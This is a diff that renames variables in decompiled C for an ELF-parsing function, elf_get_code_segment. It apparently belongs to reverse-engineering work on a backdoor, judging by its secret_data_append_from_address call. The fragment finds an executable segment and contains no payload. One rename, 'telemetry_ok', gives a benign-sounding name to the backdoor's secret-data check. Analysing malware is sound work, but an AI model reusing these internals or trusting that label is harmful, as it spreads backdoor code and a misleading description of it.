@@ -15,41 +15,41 @@
 void * elf_get_code_segment(elf_info_t *elf_info,u64 *pSize)
 
 {
-  BOOL BVar1;
-  ulong uVar2;
-  void *pvVar3;
-  Elf64_Phdr *pEVar4;
-  ulong uVar5;
-  u64 uVar6;
-  long lVar7;
+  BOOL telemetry_ok;
+  ulong segment_start;
+  void *code_segment;
+  Elf64_Phdr *phdr;
+  ulong segment_end;
+  u64 segment_size;
+  long phdr_index;
   
-  BVar1 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0xcb,7,0xc);
-  pvVar3 = (void *)0x0;
-  if (BVar1 != FALSE) {
-    pvVar3 = (void *)elf_info->code_segment_start;
-    if (pvVar3 == (void *)0x0) {
-      for (lVar7 = 0; (uint)lVar7 < (uint)(ushort)elf_info->e_phnum; lVar7 = lVar7 + 1) {
-        pEVar4 = elf_info->phdrs + lVar7;
-        if ((pEVar4->p_type == 1) && ((pEVar4->p_flags & 1) != 0)) {
-          uVar2 = (long)elf_info->elfbase + (pEVar4->p_vaddr - elf_info->first_vaddr);
-          uVar5 = pEVar4->p_memsz + uVar2;
-          pvVar3 = (void *)(uVar2 & 0xfffffffffffff000);
-          if ((uVar5 & 0xfff) != 0) {
-            uVar5 = (uVar5 & 0xfffffffffffff000) + 0x1000;
+  telemetry_ok = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0xcb,7,0xc);
+  code_segment = (void *)0x0;
+  if (telemetry_ok != FALSE) {
+    code_segment = (void *)elf_info->code_segment_start;
+    if (code_segment == (void *)0x0) {
+      for (phdr_index = 0; (uint)phdr_index < (uint)(ushort)elf_info->e_phnum; phdr_index = phdr_index + 1) {
+        phdr = elf_info->phdrs + phdr_index;
+        if ((phdr->p_type == 1) && ((phdr->p_flags & 1) != 0)) {
+          segment_start = (long)elf_info->elfbase + (phdr->p_vaddr - elf_info->first_vaddr);
+          segment_end = phdr->p_memsz + segment_start;
+          code_segment = (void *)(segment_start & 0xfffffffffffff000);
+          if ((segment_end & 0xfff) != 0) {
+            segment_end = (segment_end & 0xfffffffffffff000) + 0x1000;
           }
-          uVar6 = uVar5 - (long)pvVar3;
-          elf_info->code_segment_start = (u64)pvVar3;
-          elf_info->code_segment_size = uVar6;
+          segment_size = segment_end - (long)code_segment;
+          elf_info->code_segment_start = (u64)code_segment;
+          elf_info->code_segment_size = segment_size;
           goto LAB_00101f65;
         }
       }
     }
     else {
-      uVar6 = elf_info->code_segment_size;
+      segment_size = elf_info->code_segment_size;
 LAB_00101f65:
-      *pSize = uVar6;
+      *pSize = segment_size;
     }
   }
-  return pvVar3;
+  return code_segment;
 }
 
